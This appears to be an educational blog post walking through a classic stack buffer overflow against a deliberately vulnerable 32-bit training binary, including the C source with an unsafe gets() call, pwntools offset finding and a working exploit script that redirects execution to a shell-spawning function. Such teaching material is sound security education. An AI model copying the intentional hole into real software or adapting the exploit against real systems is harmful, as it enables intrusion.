---
title: "Buffer Overflows for the Curious"
subtitle: "A walk through stack-based exploitation, or: why I love crashing things on purpose"
date: 2026-04-18
tags: [exploitation, x86, ctf]
cover: ""
---

# the setup

Every now and then I sit down with a deliberately broken binary and remember why I got into this in the first place. There's something deeply satisfying about a program that **does exactly what you tell it to** — even when what you're telling it is "please corrupt your own return address and jump into a string I just gave you."

This post is a quick tour through a classic stack buffer overflow on a 32-bit Linux binary with NX and ASLR disabled. Training wheels. The point isn't to flex; it's to make the mental model click.

## the vulnerable program

Here's the target. It's the kind of code you'd find in an intro reverse-engineering course — and, depressingly, in production firmware from 2008.

```c
#include <stdio.h>
#include <string.h>

void win() {
    printf("[+] you win\n");
    system("/bin/sh");
}

void vuln() {
    char buf[64];
    gets(buf);  // do not do this
}

int main() {
    vuln();
    return 0;
}
```

> `gets()` is the kind of function that should come with a warning sticker. It will happily read until you give it a newline, and it does not care how big your buffer is.

## finding the offset

We need to figure out how much padding lands us exactly on the saved return address. I generate a cyclic pattern, feed it in, and watch the segfault address.

```bash
$ python3 -c "import pwn; print(pwn.cyclic(200).decode())" > input
$ ./vuln < input
Segmentation fault (core dumped)
$ dmesg | tail -1
[12345.678] vuln[4242]: segfault at 6261616a ip 6261616a
$ python3 -c "import pwn; print(pwn.cyclic_find(0x6261616a))"
72
```

So **72 bytes** of padding, then the next 4 bytes overwrite EIP. From there it's a matter of pointing it at `win()`.

## the payload

```python
from pwn import *

elf = ELF('./vuln')
win_addr = elf.symbols['win']

payload  = b'A' * 72
payload += p32(win_addr)

io = process('./vuln')
io.sendline(payload)
io.interactive()
```

And we're in:

```
[+] you win
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$
```

## what i actually take away

The exploit isn't the point. The point is the *mental shift*: code is data, data is code, and the boundary between them is a social convention enforced by hardware that you can absolutely talk out of doing its job.

That shift — that everything is bytes, all the way down — is the same one that makes me a better defender. You can't protect a system you don't believe is breakable.
